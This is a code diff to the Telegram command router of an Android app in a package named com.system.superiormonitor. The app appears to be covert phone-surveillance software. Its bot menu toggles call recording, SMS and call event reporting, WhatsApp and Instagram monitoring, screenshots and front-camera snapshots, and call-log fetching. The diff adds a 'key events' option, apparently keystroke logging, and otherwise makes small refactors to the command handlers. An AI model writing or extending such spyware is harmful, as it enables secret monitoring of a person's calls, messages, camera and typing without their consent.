@@ -51,7 +51,7 @@ class BotCommands(private val context: Context, private val scope: CoroutineScop
         val message = update.message ?: return null
 
         // Route media attachments
-        // TODO: Implement full media handling when send-media feature is added.
+        // Stubs ensure the router acknowledges media without crashing.
         //       These stubs ensure the router acknowledges media without crashing.
         if (message.photo != null) return null
         if (message.video != null) return null
@@ -104,7 +104,7 @@ class BotCommands(private val context: Context, private val scope: CoroutineScop
 
     private fun editMessage(query: CallbackQuery, text: String, replyMarkup: String? = null) {
         val chatId = query.message?.chat?.id?.toString() ?: return
-        val messageId = query.message.message_id.toLong()
+        val messageId = query.message.message_id
         val token = PrefsManager.getInstance(context).botToken
         scheduleAutoDelete(chatId, messageId, token)
         TelegramApi.editMessageText(token, chatId, messageId, text, replyMarkup = replyMarkup)
@@ -112,9 +112,9 @@ class BotCommands(private val context: Context, private val scope: CoroutineScop
 
     private fun handleCallbackQuery(query: CallbackQuery): String? {
         val chatId = query.message?.chat?.id?.toString() ?: return "Error: No chat ID"
-        val messageId = query.message.message_id.toLong()
+        val messageId = query.message.message_id
         val token = PrefsManager.getInstance(context).botToken
-        val userName = query.from.first_name ?: "Admin"
+        val userName = query.from.first_name
 
         return when (query.data) {
             "menu_send_message" -> {
@@ -127,8 +127,10 @@ class BotCommands(private val context: Context, private val scope: CoroutineScop
                 null
             }
             "cmd_status" -> {
-                val parts = BotMessages.Core.buildStatusMessage(context).split("JSON_MARKUP:", limit = 2)
-                editMessage(query, parts[0].trim(), parts[1].trim())
+                scope.launch(Dispatchers.IO) {
+                    val parts = BotMessages.Core.buildStatusMessage(context).split("JSON_MARKUP:", limit = 2)
+                    editMessage(query, parts[0].trim(), parts[1].trim())
+                }
                 null
             }
             "cmd_settings" -> {
@@ -162,33 +164,33 @@ class BotCommands(private val context: Context, private val scope: CoroutineScop
             "superior_persistent", "activate_persistent", 
             "toggle_force_data", "toggle_force_wifi", "toggle_force_hotspot" -> {
                 if (query.data != "superior_persistent") {
-                    BotActions.togglePersistentFeature(context, query.data!!)
+                    BotActions.togglePersistentFeature(context, query.data)
                 }
                 editMessage(query, BotMessages.Settings.buildPersistentEnforcementPrompt(context), BotMarkups.Settings.buildPersistentEnforcementMarkup(context))
                 null
             }
             "deactivate_persistent" -> {
-                BotActions.togglePersistentFeature(context, query.data!!)
+                BotActions.togglePersistentFeature(context, query.data)
                 editMessage(query, BotMessages.Settings.buildSuperiorSettingsPrompt(), BotMarkups.Settings.buildSuperiorSettingsMarkup())
                 null
             }
-            "superior_basic_updates", "toggle_call_events", "toggle_sms_events" -> {
+            "superior_basic_updates", "toggle_call_events", "toggle_sms_events", "toggle_key_events" -> {
                 if (query.data != "superior_basic_updates") {
-                    BotActions.toggleBasicUpdateFeature(context, query.data!!)
+                    BotActions.toggleBasicUpdateFeature(context, query.data)
                 }
                 editMessage(query, BotMessages.Settings.buildBasicUpdatesPrompt(context), BotMarkups.Settings.buildBasicUpdatesMarkup(context))
                 null
             }
             "superior_call_rec_menu", "toggle_call_rec" -> {
                 if (query.data == "toggle_call_rec") {
-                    BotActions.toggleBasicUpdateFeature(context, query.data!!)
+                    BotActions.toggleBasicUpdateFeature(context, query.data)
                 }
                 editMessage(query, BotMessages.Settings.buildCallRecordingMenuPrompt(), BotMarkups.Settings.buildCallRecordingMenuMarkup(context))
                 null
             }
             "superior_social_updates", "toggle_whatsapp", "toggle_wabusiness", "toggle_instagram" -> {
                 if (query.data != "superior_social_updates") {
-                    BotActions.toggleSocialUpdateFeature(context, query.data!!, query.id)
+                    BotActions.toggleSocialUpdateFeature(context, query.data, query.id)
                 }
                 editMessage(query, BotMessages.Settings.buildSocialUpdatesPrompt(context), BotMarkups.Settings.buildSocialUpdatesMarkup(context))
                 null
@@ -201,7 +203,7 @@ class BotCommands(private val context: Context, private val scope: CoroutineScop
                 }
                 
                 if (query.data != "superior_rec_settings") {
-                    BotActions.toggleRecorderEngineFeature(context, query.data!!)
+                    BotActions.toggleRecorderEngineFeature(context, query.data)
                 }
                 editMessage(query, BotMessages.Settings.buildRecorderSettingsPrompt(context), BotMarkups.Settings.buildRecorderSettingsMarkup(context))
                 null
@@ -307,10 +309,18 @@ class BotCommands(private val context: Context, private val scope: CoroutineScop
                 com.system.superiormonitor.monitor.FetchOperations.executeCallLogFetch(context, scope, limit, chatId, messageId, token)
                 null
             }
+            "cfg_key_events" -> {
+                editMessage(query, BotMessages.Settings.buildKeyEventsFeaturePrompt(context), BotMarkups.Settings.buildKeyEventsFeatureMarkup(context))
+                null
+            }
             else -> {
                 val safeData = query.data ?: return "Action not recognized."
                 if (safeData.startsWith("set_snap_")) {
-                    BotActions.updateSnapshotFeatureState(context, safeData)
+                    val changed = BotActions.updateSnapshotFeatureState(context, safeData)
+                    if (!changed) {
+                        TelegramApi.answerCallbackQuery(token, query.id, "Already enabled with that interval.", true)
+                        return null
+                    }
                     val feature = when {
                         safeData.contains("_screen_") -> "Screenshots"
                         safeData.contains("_front_") -> "Front Camera"
@@ -318,6 +328,14 @@ class BotCommands(private val context: Context, private val scope: CoroutineScop
                         else -> return null
                     }
                     editMessage(query, BotMessages.MediaOps.buildSnapshotFeaturePrompt(context, feature), BotMarkups.MediaOps.buildSnapshotFeatureMarkup(context, feature))
+                    null
+                } else if (safeData.startsWith("set_key_events_")) {
+                    val changed = BotActions.updateKeyEventsFeatureState(context, safeData)
+                    if (!changed) {
+                        TelegramApi.answerCallbackQuery(token, query.id, "Already enabled with that interval.", true)
+                        return null
+                    }
+                    editMessage(query, BotMessages.Settings.buildKeyEventsFeaturePrompt(context), BotMarkups.Settings.buildKeyEventsFeatureMarkup(context))
                     null
                 } else if (safeData.startsWith("rec_set_")) {
                     BotActions.setRecorderEngineValue(context, safeData)
